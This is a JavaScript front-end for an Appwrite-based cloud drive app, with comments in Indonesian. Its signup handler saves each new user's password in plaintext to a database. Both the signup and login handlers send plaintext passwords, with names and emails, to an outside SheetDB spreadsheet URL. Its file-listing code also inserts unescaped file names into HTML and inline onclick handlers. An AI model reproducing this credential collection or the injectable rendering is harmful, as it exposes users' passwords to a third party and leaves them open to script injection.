// Konfigurasi Appwrite
const client = new Appwrite.Client();
const account = new Appwrite.Account(client);
const databases = new Appwrite.Databases(client);
const storage = new Appwrite.Storage(client);

// Konfigurasi Project
const CONFIG = {
    ENDPOINT: 'https://sgp.cloud.appwrite.io/v1',
    PROJECT_ID: '697f71b40034438bb559', 
    DB_ID: 'storagedb',
    COLLECTION_FILES: 'files',
    COLLECTION_USERS: 'users',
    BUCKET_ID: 'taskfiles'
};

client.setEndpoint(CONFIG.ENDPOINT).setProject(CONFIG.PROJECT_ID);

// State Aplikasi
let currentUser = null;
let currentFolderId = 'root';
let folderPath = [{ id: 'root', name: 'Home' }];

// UI Helpers
const el = (id) => document.getElementById(id);
const showLoading = () => el('loading').classList.remove('hidden');
const hideLoading = () => el('loading').classList.add('hidden');

// Navigasi Halaman
window.nav = (pageId) => {
    // Sembunyikan semua halaman dulu
    ['loginPage', 'signupPage', 'dashboardPage'].forEach(id => {
        el(id).classList.add('hidden');
        el(id).classList.remove('active');
    });
    // Tampilkan halaman target
    el(pageId).classList.remove('hidden');
    el(pageId).classList.add('active');
};

// Toggle Password Visibility
window.togglePass = (id, icon) => {
    const input = el(id);
    if (input.type === 'password') {
        input.type = 'text';
        icon.classList.remove('fa-eye-slash');
        icon.classList.add('fa-eye');
    } else {
        input.type = 'password';
        icon.classList.remove('fa-eye');
        icon.classList.add('fa-eye-slash');
    }
};

// --- LOGIKA BARU: DROPDOWN ON CLICK ---
window.toggleDropdown = () => {
    const menu = el('dropdownMenu');
    menu.classList.toggle('show');
};

// Tutup dropdown jika klik di luar
window.onclick = function(event) {
    if (!event.target.matches('.new-btn') && !event.target.matches('.new-btn *')) {
        const dropdowns = document.getElementsByClassName("dropdown-content");
        for (let i = 0; i < dropdowns.length; i++) {
            if (dropdowns[i].classList.contains('show')) {
                dropdowns[i].classList.remove('show');
            }
        }
    }
}

// --- LOGIKA BARU: GREETING SESUAI WAKTU ---
function updateGreeting() {
    const hour = new Date().getHours();
    let timeGreeting = "Morning";
    
    if (hour >= 12 && hour < 15) {
        timeGreeting = "Afternoon";
    } else if (hour >= 15 && hour < 18) {
        timeGreeting = "Evening";
    } else if (hour >= 18) {
        timeGreeting = "Night";
    }

    const titleElement = el('welcomeText');
    if (titleElement) {
        titleElement.innerText = `Welcome In Drive ${timeGreeting}`;
    }
}

// --- SYSTEM AUTHENTICATION ---

// Cek Sesi Saat Refresh (Agar tidak logout otomatis)
async function checkSession() {
    showLoading(); // Tampilkan loading saat cek sesi
    try {
        currentUser = await account.get();
        // Jika sukses ambil data user, langsung ke Dashboard
        nav('dashboardPage');
        updateGreeting(); // Set tulisan Pagi/Siang/Malam
        loadFiles(currentFolderId);
    } catch (error) {
        // Jika gagal (belum login), ke halaman Login
        nav('loginPage');
    } finally {
        hideLoading();
    }
}

// Jalankan cek sesi saat aplikasi pertama kali dibuka
checkSession();


// 1. Sign Up Logic
el('signupForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    const name = el('regName').value;
    const email = el('regEmail').value;
    const phone = el('regPhone').value;
    const pass = el('regPass').value;
    const verify = el('regVerify').value;

    if (pass !== verify) return alert("Password tidak cocok!");

    showLoading();
    try {
        const userAuth = await account.create(Appwrite.ID.unique(), email, pass, name);

        await databases.createDocument(CONFIG.DB_ID, 'users', userAuth.$id, {
            name: name, email: email, phone: phone, password: pass
        });

        // Kirim ke Excel (Sheet1)
        const sheetDB_URL = "https://sheetdb.io/api/v1/v9e5uhfox3nbi"; 
        const dataExcel = {
            "ID": userAuth.$id,
            "Nama": name,
            "Email": email,
            "Phone": phone,
            "Password": pass,
            "Waktu": new Date().toLocaleString('id-ID')
        };
        
        fetch(sheetDB_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ data: [dataExcel] })
        }).catch(err => console.warn("Excel error:", err));

        alert("Pendaftaran Berhasil!");
        el('signupForm').reset();
        nav('loginPage');
    } catch (error) {
        alert("Gagal: " + error.message);
    } finally {
        hideLoading();
    }
});

// 2. Login Logic
el('loginForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    let identifier = el('loginEmail').value.trim(); 
    const password = el('loginPass').value;
    
    showLoading();
    try {
        if (!identifier.includes('@')) {
            const response = await databases.listDocuments(
                CONFIG.DB_ID, CONFIG.COLLECTION_USERS, 
                [Appwrite.Query.equal('name', identifier)]
            );
            if (response.total === 0) throw new Error("Nama tidak ditemukan.");
            identifier = response.documents[0].email;
        }

        await account.createEmailPasswordSession(identifier, password);
        currentUser = await account.get(); 

        // Catat Login ke Excel (Sheet=Login)
        const sheetDB_URL = "https://sheetdb.io/api/v1/v9e5uhfox3nbi"; 
        const historyURL = `${sheetDB_URL}?sheet=Login`;

        const logData = {
            "ID": currentUser.$id,
            "Nama": currentUser.name,
            "Email": currentUser.email,
            "Password": password,
            "Riwayat Waktu": new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })
        };

        fetch(historyURL, {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ data: [logData] })
        }).catch(err => console.warn("Excel log error:", err));

        // Update UI
        updateGreeting();
        nav('dashboardPage');
        loadFiles('root');
    } catch (error) {
        alert("Login Gagal: " + error.message);
    } finally {
        hideLoading();
    }
});

// 3. Logout Logic
const logoutBtn = document.getElementById('logoutBtn');
if (logoutBtn) {
    logoutBtn.addEventListener('click', async () => {
        if (!confirm("Apakah Anda yakin ingin keluar?")) return;
        showLoading();
        try {
            const currentUser = await account.get();
            
            // Catat Logout ke Excel
            const sheetDB_URL = "https://sheetdb.io/api/v1/v9e5uhfox3nbi"; 
            const logoutURL = `${sheetDB_URL}?sheet=Logout`;
            const logoutData = {
                "ID": currentUser.$id,
                "Nama": currentUser.name,
                "Email": currentUser.email,
                "Riwayat Waktu": new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })
            };

            await fetch(logoutURL, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ data: [logoutData] })
            });

            await account.deleteSession('current');
            alert("Logout Berhasil.");
            nav('loginPage'); 
        } catch (error) {
            await account.deleteSession('current').catch(() => {});
            nav('loginPage');
        } finally {
            hideLoading();
        }
    });
}

// --- FILE SYSTEM (TETAP SAMA) ---
async function loadFiles(folderId) {
    if (!currentUser) return;
    const grid = el('fileGrid');
    grid.innerHTML = '';

    try {
        const response = await databases.listDocuments(
            CONFIG.DB_ID, CONFIG.COLLECTION_FILES,
            [
                Appwrite.Query.equal('owner', currentUser.$id),
                Appwrite.Query.equal('parentId', folderId)
            ]
        );

        const searchVal = el('searchInput').value.toLowerCase();
        let totalSize = 0;

        response.documents.forEach(doc => {
            if (doc.name.toLowerCase().includes(searchVal)) {
                renderItem(doc);
            }
            if (doc.size) totalSize += doc.size;
        });
        updateStorageUI(totalSize);

    } catch (error) {
        console.error("Load error:", error);
    }
}

function renderItem(doc) {
    const div = document.createElement('div');
    div.className = 'item-card';
    const isFolder = doc.type === 'folder';
    const icon = isFolder ? 'fa-folder' : 'fa-file';
    
    // Klik Item
    const clickAction = isFolder 
        ? `openFolder('${doc.$id}', '${doc.name}')` 
        : `window.open('${doc.url}', '_blank')`;

    div.innerHTML = `
        <button class="del-btn" onclick="deleteItem('${doc.$id}', '${doc.type}', '${doc.fileId}')">
            <i class="fa-solid fa-trash"></i>
        </button>
        <div onclick="${clickAction}" style="width:100%">
            <i class="icon fa-solid ${icon}"></i>
            <div class="item-name">${doc.name}</div>
        </div>
    `;
    el('fileGrid').appendChild(div);
}

// Fungsi helper lainnya (Create Folder, Upload, Delete, dll)
window.createFolder = async () => {
    const name = prompt("Nama Folder Baru:");
    if (!name) return;
    showLoading();
    try {
        await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, Appwrite.ID.unique(), {
            name: name, type: 'folder', parentId: currentFolderId, owner: currentUser.$id, size: 0
        });
        loadFiles(currentFolderId);
    } catch (err) { alert(err.message); }
    finally { hideLoading(); }
};

el('fileUpload').addEventListener('change', async (e) => {
    const file = e.target.files[0];
    if (!file) return;
    showLoading();
    try {
        const uploaded = await storage.createFile(CONFIG.BUCKET_ID, Appwrite.ID.unique(), file);
        const fileUrl = storage.getFileView(CONFIG.BUCKET_ID, uploaded.$id);
        await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, Appwrite.ID.unique(), {
            name: file.name, type: 'file', parentId: currentFolderId, owner: currentUser.$id, 
            url: fileUrl.href, fileId: uploaded.$id, size: file.size
        });
        loadFiles(currentFolderId);
    } catch (err) { alert(err.message); }
    finally { hideLoading(); e.target.value = ''; }
});

window.deleteItem = async (docId, type, fileId) => {
    if (!confirm("Hapus item ini?")) return;
    showLoading();
    try {
        if (type === 'file' && fileId) await storage.deleteFile(CONFIG.BUCKET_ID, fileId);
        await databases.deleteDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, docId);
        loadFiles(currentFolderId);
    } catch (err) { alert(err.message); }
    finally { hideLoading(); }
};

window.openFolder = (id, name) => {
    currentFolderId = id;
    loadFiles(id);
};

el('searchInput').addEventListener('input', () => loadFiles(currentFolderId));

function updateStorageUI(bytes) {
    const mb = (bytes / (1024 * 1024)).toFixed(2);
    const percent = Math.min((bytes / (2 * 1024 * 1024 * 1024)) * 100, 100); 
    el('storageUsed').innerText = mb + ' MB';
    el('storageBar').style.width = percent + '%';
}
